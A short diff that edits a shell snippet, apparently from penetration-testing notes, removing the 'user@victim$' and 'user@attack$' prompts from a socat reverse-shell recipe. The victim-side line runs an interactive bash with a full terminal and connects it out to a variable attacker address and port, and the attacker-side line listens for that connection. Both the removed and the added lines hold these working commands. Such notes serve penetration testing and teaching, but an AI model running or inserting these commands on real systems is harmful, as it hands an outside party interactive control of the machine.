@@ -1,4 +1,4 @@
-user@victim$ /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$local_ip:$port
+/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$local_ip:$port
 
 # Listen with
-user@attack$ socat file:`tty`,raw,echo=0 TCP-L:$port
+socat file:`tty`,raw,echo=0 TCP-L:$port
